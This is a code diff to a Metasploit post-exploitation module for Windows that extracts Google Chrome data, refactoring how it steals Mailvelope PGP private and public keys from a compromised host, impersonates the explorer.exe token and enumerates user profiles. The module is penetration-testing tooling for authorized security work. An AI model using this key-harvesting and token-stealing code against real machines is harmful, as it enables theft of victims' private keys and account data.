@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Post
 				[
 					'Sven Taute', #Original (Meterpreter script)
 					'sinn3r',     #Metasploit post module
-					'Kx499',       #x64 support
+					'Kx499',      #x64 support
 					'mubix'       #Parse extensions
 				]
 		))
@@ -42,6 +42,22 @@ class Metasploit3 < Msf::Post
 
 	def extension_mailvelope_parse_key(data)
 		return data.gsub("\x00","").tr("[]","").gsub("\\r","").gsub("\"","").gsub("\\n","\n")
+	end
+
+	def extension_mailvelope_store_key(name, value)
+		return unless name =~ /(private|public)keys/i
+
+		priv_or_pub = $1
+
+		keys = value.split(",")
+		print_good("==> Found #{keys.size} #{priv_or_pub} key(s)!")
+		keys.each do |key|
+			key_data = extension_mailvelope_parse_key(key)
+			vprint_good(key_data)
+			path = store_loot(
+				"chrome.mailvelope.#{priv_or_pub}", "text/plain", session, key_data, "#{priv_or_pub}.key", "Mailvelope PGP #{priv_or_pub.capitalize} Key")
+			print_status("==> Saving #{priv_or_pub} key to: #{path}")
+		end
 	end
 
 	def extension_mailvelope(username, extname)
@@ -60,35 +76,15 @@ class Metasploit3 < Msf::Post
 		columns, *rows = maildb.execute2("select * from ItemTable;")
 		maildb.close
 
-		rows.each do |row|
-			res = Hash[*columns.zip(row).flatten]
-			if res["key"] =~ /privatekeys/i
-				keys = res["value"].split(",")
-				print_good("==> Found #{keys.size} private key(s)!")
-				keys.each do |key|
-					privkey = extension_mailvelope_parse_key(key)
-					vprint_good(privkey)
-					path = store_loot("chrome.mailvelope.privkey", "text/plain", session, privkey, "privkey.key", "Mailvelope PGP Private Key")
-					print_status("==> Saving private key to: #{path}")
-				end
-			end
-			if res["key"] =~ /publickeys/i
-				keys = res["value"].split(",")
-				print_good("==> Found #{keys.size} public key(s)!")
-				keys.each do |key|
-					pubkey = extension_mailvelope_parse_key(key)
-					vprint_good(pubkey)
-					path = store_loot("chrome.mailvelope.pubkey", "text/plain", session, pubkey, "pubkey.key", "Mailvelope PGP Public Key")
-					print_status("==> Saving public key to: #{path}")
-				end
-			end
+		rows.each do |name, value|
+			extension_mailvelope_store_key(name, value)
 		end
 	end
 
 
 
 	def parse_prefs(username, filepath)
-		f = File.open(filepath, 'r')
+		f = File.open(filepath, 'rb')
 		until f.eof
 			prefs = f.read
 		end
@@ -221,17 +217,12 @@ class Metasploit3 < Msf::Post
 		current_pid = session.sys.process.open.pid
 		target_pid = session.sys.process["explorer.exe"]
 		return if target_pid == current_pid
-
-		if not session.incognito
-			session.core.use("incognito")
-
-			if not session.incognito
-				print_error("Unable to load incognito")
-				return false
-			end
+		if target_pid.to_s.empty?
+			print_warning("No explorer.exe process to impersonate.")
+			return
 		end
 
-		print_status("Impersonating token: #{target_pid.to_s}")
+		print_status("Impersonating token: #{target_pid}")
 		begin
 			session.sys.config.steal_token(target_pid)
 			return true
@@ -286,7 +277,6 @@ class Metasploit3 < Msf::Post
 		]
 
 		@old_pid = nil
-		@host_info = session.sys.config.sysinfo
 		migrate_success = false
 
 		# If we can impersonate a token, we use that first.
@@ -299,37 +289,39 @@ class Metasploit3 < Msf::Post
 		host = session.session_host
 
 		#Get Google Chrome user data path
-		sysdrive = session.fs.file.expand_path("%SYSTEMDRIVE%")
-		os = @host_info['OS']
-		if os =~ /(Windows 7|2008|Vista)/
-			@profiles_path = sysdrive + "\\Users\\"
+		sysdrive = expand_path("%SYSTEMDRIVE%").strip
+		if directory?("#{sysdrive}\\Users")
+			@profiles_path = "#{sysdrive}/Users"
 			@data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
-		elsif os =~ /(2000|NET|XP)/
-			@profiles_path = sysdrive + "\\Documents and Settings\\"
+		elsif directory?("#{sysdrive}\\Documents and Settings")
+			@profiles_path = "#{sysdrive}/Documents and Settings"
 			@data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
 		end
 
 		#Get user(s)
 		usernames = []
-		uid = session.sys.config.getuid
 		if is_system?
 			print_status("Running as SYSTEM, extracting user list...")
-			print_error("(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")")
+			print_warning("(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")")
 			session.fs.dir.foreach(@profiles_path) do |u|
-				usernames << u if u !~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
+				not_actually_users = [
+					".", "..", "All Users", "Default", "Default User", "Public", "desktop.ini",
+					"LocalService", "NetworkService"
+				]
+				usernames << u unless not_actually_users.include?(u)
 			end
 			print_status "Users found: #{usernames.join(", ")}"
 		else
+			uid = session.sys.config.getuid
 			print_status "Running as user '#{uid}'..."
-			usernames << session.fs.file.expand_path("%USERNAME%")
+			usernames << expand_path("%USERNAME%").strip
 		end
-
 
 		has_sqlite3 = true
 		begin
 			require 'sqlite3'
 		rescue LoadError
-			print_error("SQLite3 is not available, and we are not able to parse the database.")
+			print_warning("SQLite3 is not available, and we are not able to parse the database.")
 			has_sqlite3 = false
 		end
 
